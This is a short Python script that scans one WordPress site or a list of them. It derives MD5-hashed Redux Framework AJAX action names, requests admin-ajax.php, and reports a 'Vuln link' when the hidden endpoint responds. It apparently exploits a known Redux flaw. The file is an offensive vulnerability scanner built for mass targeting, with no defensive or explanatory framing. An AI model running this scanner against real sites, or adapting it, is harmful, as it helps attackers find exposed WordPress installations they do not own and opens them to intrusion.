import argparse,hashlib,requests

parser = argparse.ArgumentParser()
parser.add_argument('--list', action='store', dest='list', required=False, help='Target list.')
parser.add_argument('--url', action='store', dest='url', required=False, help='Target url.')
arguments = parser.parse_args()
targets = []

def getRedux(url, key):
    return requests.get(url+'/wp-admin/admin-ajax.php?action=' + key).text

def encodeRedux(url):
    value = url + '/-redux'  
    return hashlib.md5(value.encode()).hexdigest()

def getKey(url, key):
    return requests.get(url + '/wp-admin/admin-ajax.php?action=' + key + '&code=' + '').status_code

def encodeKey(url):
    value = url + '-support'
    return hashlib.md5(value.encode()).hexdigest()

def main(targets):
    for target in targets:
        print("\n[+] Target: " + target)
        try:
            responseValue = getKey(target, encodeKey(getRedux(target, encodeRedux(target))))
            if responseValue == 200:
                print("[+] Vuln link: " + target + '/wp-admin/admin-ajax.php?action=' + encodeKey(getRedux(target, encodeRedux(target))) + '&code=' + '' )
            else:
                print('[-] Not vuln :( )')
        except:
            print('[!] ERROR!!!')

if(arguments.url != None and arguments.list == None):
    targets.append(arguments.url)
    main(targets)

elif(arguments.url != None and arguments.list != None):
    print('You are lost? Look at help!!!')
    exit()

else:
    try:
        target_list = open(arguments.list, 'r', errors='ignore')
        for target in target_list.read().splitlines():
            targets.append(target)
        main(targets)

    except FileNotFoundError:
        print('[-] File with url not found.')
        exit()